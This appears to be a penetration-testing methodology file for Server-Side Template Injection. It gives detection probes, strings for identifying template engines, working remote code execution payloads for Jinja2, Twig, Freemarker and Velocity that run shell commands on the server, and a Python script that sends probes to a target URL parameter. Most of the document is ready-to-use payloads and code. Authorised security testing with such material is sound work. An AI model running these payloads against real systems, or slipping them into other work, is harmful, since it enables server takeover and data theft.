---
name: ssti
description: Server-Side Template Injection testing methodology
version: 1.0.0
tags: [injection, template, A03:2021]
---

# SSTI Testing Methodology

## Overview
SSTI occurs when user input is embedded directly into server-side templates, allowing code execution.

## Detection
```
${7*7}
{{7*7}}
#{7*7}
${{7*7}}
<%= 7*7 %>
{{= 7*7}}
```

If you see `49` in response, template injection likely exists.

## Template Engine Identification

### Jinja2/Twig
```
{{7*7}} → 49
{{config}} → Config object dump
```

### Freemarker
```
${7*7} → 49
<#assign x=7*7>${x}
```

### Velocity
```
#set($x = 7*7)$x
```

### Thymeleaf
```
[[${7*7}]]
```

### Pebble
```
{{7*7}}
```

## RCE Payloads

### Jinja2 (Python)
```python
{{config.__class__.__init__.__globals__['os'].popen('id').read()}}
{{''.__class__.__mro__[1].__subclasses__()[396]('id',shell=True,stdout=-1).communicate()}}
```

### Twig (PHP)
```php
{{_self.env.registerUndefinedFilterCallback("exec")}}{{_self.env.getFilter("id")}}
```

### Freemarker (Java)
```
<#assign ex="freemarker.template.utility.Execute"?new()>${ex("id")}
```

### Velocity (Java)
```
#set($x='')#set($rt=$x.class.forName('java.lang.Runtime'))#set($chr=$x.class.forName('java.lang.Character'))#set($str=$x.class.forName('java.lang.String'))#set($ex=$rt.getRuntime().exec('id'))$ex.waitFor()#set($out=$ex.getInputStream())#foreach($i in [1..$out.available()])$str.valueOf($chr.toChars($out.read()))#end
```

## PoC Template
```python
import requests

def test_ssti(url, param):
    payloads = [
        ('{{7*7}}', '49'),
        ('${7*7}', '49'),
        ('#{7*7}', '49'),
    ]
    
    for payload, expected in payloads:
        r = requests.get(url, params={param: payload})
        if expected in r.text:
            print(f"[+] SSTI detected with: {payload}")
            return True
    return False
```

## Impact
- Remote Code Execution
- Server compromise
- Data theft
